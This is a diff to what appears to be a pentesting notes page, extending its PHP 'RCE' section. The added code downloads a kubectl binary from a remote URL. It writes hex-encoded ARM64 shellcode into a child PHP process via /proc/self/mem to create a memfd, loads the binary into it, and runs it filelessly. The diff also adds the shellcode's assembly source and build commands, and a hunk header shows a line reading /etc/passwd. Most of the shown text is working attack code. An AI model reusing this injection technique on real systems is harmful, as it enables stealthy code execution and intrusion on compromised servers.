@@ -221,8 +221,22 @@ echo file_get_contents("/etc/passwd");
 ## RCE
 
 ```php
-# Execute binary
+# Download binary to memory
+$bin_url = "https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl";
+$handle = fopen($bin_url, "r");
+$binary = "";
+while (!feof($handle)) {
+    $binary .= fread($handle, 2048);
+}
+fclose($handle);
+$bin_size = strlen($binary);
+$hex_size = pack('P', $bin_size);
+$hex_size_str = bin2hex($hex_size);
 
+$hexstr_shellcode = "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4e40300aa26030010c60040f9e10306aac80580d2010000d4c81b80d2000080d2e10306aa620080d2230080d2050080d2010000d4e80780d2e10300aae20306aa000080d2010000d4420000eb2100008b81ffff54881580d2010000d4610280d2281080d2010000d4" . $hex_size_str;
+
+
+# Execute binary
 $cmd_array = [
     'php',
     '-a'
@@ -239,12 +253,12 @@ $process = proc_open($cmd_array,$descriptorspec,$pipes);
 $status = proc_get_status($process);
 $pid = $status['pid'];
 
+
+
 # Execute shellcode in child process
-$payload = "\n\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ="; $shellcode = base64_decode($shellcode_b64); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n";
+$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode = hex2bin("'.$hexstr_shellcode.'"); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n".$binary; # 2 new lines are needed
 
 fwrite($pipes[0], $payload);
-
-sleep(0.5);
 
 # Check it was created
 function listFilesInFolder($folderPath) {
@@ -260,8 +274,6 @@ function listFilesInFolder($folderPath) {
 
 listFilesInFolder("/proc/$pid/fd/");
 
-# Load kubectl in memfd (NOT WORKING)
-file_put_contents("/proc/$pid/fd/3", file_get_contents("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl"));
 
 # Execute kubectl
 $cmd_array_kubectl = [
@@ -279,4 +291,62 @@ $process2 = proc_open($cmd_array_kubectl,$descriptorspec_kubectl,$pipes_kubectl)
 sleep(0.5);
 echo stream_get_contents($pipes_kubectl[1]);
 proc_close($process2);
+```
+
+```
+To compile shellcode:
+
+as a.s -o a.o
+objcopy -O binary a.o
+xxd -ps a.o | tr -d '\n'
+
+
+Shellcode:
+
+.arch armv8-a
+.global _start
+
+_start:
+        movz    x0, #0x4144
+        movk    x0, #0x4445, lsl #16
+        str     x0, [sp, #-0x10]!
+        mov     x0, sp
+        eor     x1, x1, x1
+        mov     x8, #0x117
+        svc     #0 // memfd_create
+
+        mov     x4, x0 //save fd for mmap
+
+        adr     x6, filesz
+        ldr     x6, [x6]
+        mov     x1, x6    
+        mov     x8, #0x2e
+        svc     #0 // ftruncate
+        
+        mov     x8, #0xde
+        mov     x0, #0
+        mov     x1, x6
+        mov     x2, #3 // RW
+        mov     x3, #1 // MAP_SHARED
+        mov     x5, #0
+        svc     #0 // mmap
+
+        mov     x8, #0x3f
+        mov     x1, x0 // address returned by mmap
+        mov     x2, x6
+    
+    read_more:
+        mov     x0, #0
+        svc     #0 // read
+        subs    x2, x2, x0
+        add     x1, x1, x0
+        bne     read_more
+
+        mov     x8, #0xac
+        svc     #0 // getpid
+        mov     x1, #0x13 // SIGSTOP
+        mov     x8, #0x81
+        svc     #0 // kill
+
+    filesz:
 ```
